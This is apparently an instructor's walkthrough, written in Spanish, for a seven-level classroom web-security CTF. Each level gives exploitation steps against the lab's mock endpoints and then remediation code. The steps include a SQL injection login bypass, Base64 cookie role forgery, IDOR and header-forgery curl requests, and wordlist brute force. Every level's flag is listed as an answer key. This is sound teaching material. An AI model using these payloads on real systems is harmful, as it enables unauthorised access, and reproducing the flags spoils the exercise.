# GUÍA DEL INSTRUCTOR // CYBER LAB CTF (2º SMR)

Documento pedagógico y técnico de referencia para el profesorado del módulo de **Seguridad Informática (SI)** y los alumnos de 2º SMR.
Detalla la fundamentación teórica, los pasos exactos de explotación de cada uno de los 7 niveles del laboratorio y el código de remediación en entornos de producción.

---

## Índice de Niveles y Banderas

| Nivel | Categoría | Vulnerabilidad Simulada | Flag Oficial | Puntos |
| :--- | :--- | :--- | :--- | :--- |
| **1** | Reconocimiento | Fuga de información en DOM y `robots.txt` | `FLAG{DOM_C0MM3NTS_4ND_R0B0TS}` | 100 |
| **2** | Validación Cliente | Manipulación de campos ocultos y atributos `disabled` | `FLAG{N3V3R_TRUST_CL13NT_S1D3}` | 150 |
| **3** | Sesiones | Cookie sin `HttpOnly` y manipulación Base64 | `FLAG{C00K13_T4MP3R1NG_SUCC3SS}` | 200 |
| **4** | Control Acceso | Insecure Direct Object References (IDOR) en API | `FLAG{1D0R_4P1_BR0K3N_0BJ3CT}` | 250 |
| **5** | Inyección | Inyección SQL Clásica (`' OR '1'='1' --`) | `FLAG{S4N1T1Z3_Y0UR_1NPUTS_SQL1}` | 300 |
| **6** | Autenticación | Ataque de Diccionario / Fuerza Bruta | `FLAG{BR0K3N_4UTH_JWT_N0N3}` | 350 |
| **7** | Cadena Completa | Reconocimiento + IDOR + Falsificación de Headers | `FLAG{FULL_CH41N_M4ST3R_H4CK3R}` | 500 |

---

## Nivel 1: Reconocimiento y Fugas en el Código

### 1. Concepto Pedagógico
En la fase de reconocimiento pasivo, un auditor analiza los recursos accesibles públicamente sin enviar tráfico anómalo. Los comentarios HTML olvidados por desarrolladores son una fuente común de fuga de nombres de servidores, rutas de backups y endpoints internos.

### 2. Pasos de Explotación
1. Abrir las herramientas de desarrollo del navegador pulsando **F12**.
2. En la pestaña **Elements / Inspector**, inspeccionar el pie de página del portal SecureCorp.
3. Localizar el comentario HTML:
   ```html
   <!-- 
     TODO DE DESARROLLO (QUITAR EN PRODUCCIÓN):
     - Fichero de exclusión de robots disponible en: /lab/robots.txt
     - Copia de seguridad de notas de contingencia: /backup/staff_notes.txt
     - Flag del equipo de infraestructura: FLAG{DOM_C0MM3NTS_4ND_R0B0TS}
   -->
   ```
4. Alternativamente, en la terminal del laboratorio ejecutar:
   ```bash
   curl /lab/robots.txt
   # o
   cat /var/www/html/robots.txt
   ```

### 3. Código de Remediación Defensiva
En aplicaciones modernas (Next.js, Vite, Webpack), configurar la eliminación automática de comentarios en la fase de empaquetado para producción:
```javascript
// next.config.ts / webpack.config.js
export default {
  compiler: {
    removeConsole: process.env.NODE_ENV === 'production',
  },
  // NUNCA colocar secretos ni rutas críticas en robots.txt:
  // La seguridad debe basarse en autenticación y autorización, no en ocultar rutas.
};
```

---

## Nivel 2: El Cliente No Es De Fiar

### 1. Concepto Pedagógico
Las validaciones en JavaScript o atributos HTML (`disabled`, `maxlength`, `required`, `type="hidden"`) solo sirven para mejorar la experiencia de usuario (UX). **Cualquier dato o validación en el navegador es completamente manipulable por el usuario.**

### 2. Pasos de Explotación
1. Abrir DevTools sobre el formulario de compra de certificación.
2. Hacer doble clic sobre el atributo `disabled` en `<button id="btnBuy" disabled>` y borrarlo.
3. Localizar el campo oculto `<input type="hidden" id="checkoutPrice" value="500">` y cambiar el `value` a `0`.
4. Pulsar el botón **Adquirir Certificación**.
5. *Vía alternativa por Consola*:
   ```javascript
   sessionStorage.setItem("lab_user_balance", "1000");
   ```
6. El backend simulado procesa la transacción con éxito y entrega la flag `FLAG{N3V3R_TRUST_CL13NT_S1D3}`.

### 3. Código de Remediación Defensiva
El precio, el stock y los permisos deben consultarse siempre en la base de datos del servidor:
```typescript
export async function POST(req: Request) {
  const { itemId } = await req.json();

  // El precio se obtiene de la base de datos, NUNCA del payload del cliente
  const product = await db.products.findById(itemId);
  const user = await auth.getUser(req);

  if (user.balance < product.price) {
    return Response.json({ error: "Saldo insuficiente" }, { status: 400 });
  }

  await db.transactBalance(user.id, -product.price);
  return Response.json({ success: true });
}
```

---

## Nivel 3: Cookies Inseguras y Manipulación de Sesión

### 1. Concepto Pedagógico
Base64 es un sistema de codificación, no de cifrado. Si una cookie no tiene la bandera `HttpOnly` y almacena el rol sin firma criptográfica (HMAC), el usuario puede leerla con JavaScript y alterarla para escalar privilegios.

### 2. Pasos de Explotación
1. Abrir DevTools -> Consola (o pestaña **Application -> Cookies**).
2. Leer la cookie: `document.cookie` muestra `lab_session=eyJ1c2VyIjoic3R1ZGVudCIsInJvbGUiOiJndWVzdCJ9`.
3. Decodificar en consola:
   ```javascript
   atob("eyJ1c2VyIjoic3R1ZGVudCIsInJvbGUiOiJndWVzdCJ9")
   // Retorna: {"user":"student","role":"guest"}
   ```
4. Crear la nueva cookie con rol `admin`:
   ```javascript
   document.cookie = "lab_session=" + btoa(JSON.stringify({ user: "student", role: "admin" })) + "; path=/";
   ```
5. En el simulador, pulsar **Verificar Cookie de Sesión**. Se desbloquea `FLAG{C00K13_T4MP3R1NG_SUCC3SS}`.

### 3. Código de Remediación Defensiva
Firmar criptográficamente el token y añadir el flag `httpOnly: true`:
```typescript
import crypto from "crypto";

export function issueSessionCookie(payload: { userId: string; role: string }) {
  const secret = process.env.ADMIN_SECRET_KEY!;
  const data = Buffer.from(JSON.stringify(payload)).toString("base64url");
  const signature = crypto.createHmac("sha256", secret).update(data).digest("base64url");
  
  return {
    name: "session_token",
    value: `${data}.${signature}`,
    httpOnly: true, // Impide el acceso desde document.cookie
    secure: true,   // Solo viaja por HTTPS
    sameSite: "lax",
    maxAge: 60 * 60 * 12, // 12 horas máximo
  };
}
```

---

## Nivel 4: Insecure Direct Object References (IDOR)

### 1. Concepto Pedagógico
Ocurre cuando una API expone un objeto directamente mediante un parámetro (`?id=1042`) sin verificar que el usuario autenticado sea el dueño legítimo de dicho registro.

### 2. Pasos de Explotación
1. Al consultar la factura #1042 en el simulador, observar la petición en la pestaña **Network (Red)**: `GET /api/mock/invoices?id=1042`.
2. Probar identificadores inferiores para acceder a facturas de la directiva:
   ```bash
   curl /api/mock/invoices?id=1001
   ```
3. El servidor responde con la factura confidencial de la Dirección General y la bandera `FLAG{1D0R_4P1_BR0K3N_0BJ3CT}`.

### 3. Código de Remediación Defensiva
Aplicar control de acceso a nivel de fila (Row Level Security o filtro contextual):
```typescript
export async function GET(req: Request) {
  const session = await auth.verifySession(req);
  if (!session) return Response.json({ error: "No autorizado" }, { status: 401 });

  const invoiceId = Number(new URL(req.url).searchParams.get("id"));

  // Se añade obligatoriamente el ID del usuario autenticado en la consulta
  const invoice = await db.invoices.findFirst({
    where: {
      id: invoiceId,
      ownerId: session.userId,
    },
  });

  if (!invoice) {
    return Response.json({ error: "Factura no encontrada" }, { status: 404 });
  }

  return Response.json(invoice);
}
```

---

## Nivel 5: Inyecciones: SQL Injection

### 1. Concepto Pedagógico
Ocurre cuando entradas de usuario no sanitizadas se concatenan directamente en la sintaxis de una consulta SQL, alterando la lógica booleana del comando.

### 2. Pasos de Explotación
1. En el formulario de inicio de sesión vulnerable, observar la consulta generada:
   ```sql
   SELECT * FROM users WHERE username = '$user' AND password = '$password';
   ```
2. Introducir en el campo de usuario el payload:
   ```sql
   ' OR '1'='1' --
   ```
3. La consulta final evaluada se convierte en:
   ```sql
   SELECT * FROM users WHERE username = '' OR '1'='1' --' AND password = '...';
   ```
4. Como `'1'='1'` siempre es verdadero y `--` comenta el resto de la instrucción, la consulta devuelve la primera fila (administrador) y entrega `FLAG{S4N1T1Z3_Y0UR_1NPUTS_SQL1}`.

### 3. Código de Remediación Defensiva
Utilizar siempre consultas preparadas / parametrizadas (Prepared Statements):
```typescript
import { Pool } from "pg";
const pool = new Pool();

export async function authenticateUser(user: string, hash: string) {
  // Los parámetros $1 y $2 se envían al motor SQL de forma aislada
  const query = "SELECT id, username, role FROM users WHERE username = $1 AND password_hash = $2";
  const { rows } = await pool.query(query, [user, hash]);
  return rows[0] || null;
}
```

---

## Nivel 6: Autenticación Rota y Fuerza Bruta

### 1. Concepto Pedagógico
Los endpoints de autenticación sin límite de intentos (Rate Limiting) permiten a herramientas automatizadas probar diccionarios de contraseñas débiles en pocos segundos.

### 2. Pasos de Explotación
1. En la terminal del laboratorio, inspeccionar el diccionario disponible:
   ```bash
   cat /opt/wordlists/passwords.txt
   ```
2. Probar las contraseñas contra `/api/mock/auth` usando `curl`:
   ```bash
   curl -X POST /api/mock/auth -d "username=admin&password=hunter2"
   ```
3. El servidor confirma el inicio de sesión y entrega `FLAG{BR0K3N_4UTH_JWT_N0N3}`.

### 3. Código de Remediación Defensiva
Implementar bloqueo de intentos (Rate Limiting) y hashing con Bcrypt/Argon2:
```typescript
import bcrypt from "bcrypt";
import { rateLimiter } from "@/lib/rateLimit";

export async function POST(req: Request) {
  const ip = req.headers.get("x-forwarded-for") || "unknown";

  // Máximo 5 intentos cada 15 minutos por IP
  const allowed = await rateLimiter.check(ip, 5, 15 * 60 * 1000);
  if (!allowed) {
    return Response.json({ error: "Demasiados intentos. Bloqueado temporalmente." }, { status: 429 });
  }

  const { username, password } = await req.json();
  const user = await db.users.findUnique({ where: { username } });

  if (!user || !(await bcrypt.compare(password, user.passwordHash))) {
    return Response.json({ error: "Credenciales erróneas." }, { status: 401 });
  }

  return Response.json({ success: true });
}
```

---

## Nivel 7: Cadena de Ataque Final (Full Exploit Chain)

### 1. Concepto Pedagógico
En auditorías profesionales, los atacantes encadenan múltiples vulnerabilidades:
1. Reconocimiento (descubrimiento de endpoints en comentarios).
2. IDOR / Exposición de API interna (obtención de tokens de empleados).
3. Falsificación de cabeceras HTTP para tomar control de servidores centrales.

### 2. Pasos de Explotación
1. **Paso 1: Reconocimiento**: Inspeccionar la intranet corporativa para localizar el comentario:
   ```html
   <!-- GET /api/mock/staff?dept=security -->
   ```
2. **Paso 2: IDOR en Personal**: En la terminal, consultar el endpoint:
   ```bash
   curl /api/mock/staff?dept=security
   ```
   Respuesta obtenida:
   ```json
   {
     "departamento": "Seguridad y Ciberdefensa",
     "jefe_departamento": {
       "nombre": "Elena Ramos (CISO)",
       "emp_id": "sec-9902",
       "autorizacion": "emergency_override_2026"
     }
   }
   ```
3. **Paso 3: Falsificación de Cabeceras**: Enviar la petición al mainframe enviando las dos cabeceras:
   ```bash
   curl -H "X-Employee-Id: sec-9902" -H "Authorization: Bearer emergency_override_2026" /api/mock/admin/flag
   ```
4. El mainframe valida la identidad de Elena Ramos y entrega la bandera final del laboratorio:
   `FLAG{FULL_CH41N_M4ST3R_H4CK3R}`.

### 3. Código de Remediación Defensiva
Aplicar el principio de **Defensa en Profundidad** y **Zero Trust**:
- Nunca confiar en cabeceras inyectadas por el cliente (`X-Employee-Id`).
- Exigir tokens de sesión criptográficos firmados por un Proveedor de Identidad (IdP/OAuth/OIDC) y validar que el token pertenece al usuario y cuenta con MFA activo.
- Mantener registros de auditoría inmutables en un servidor SIEM centralizado.

---

*Cyber Lab SMR2 · Aula 35 · Material didáctico oficial para 2º SMR.*
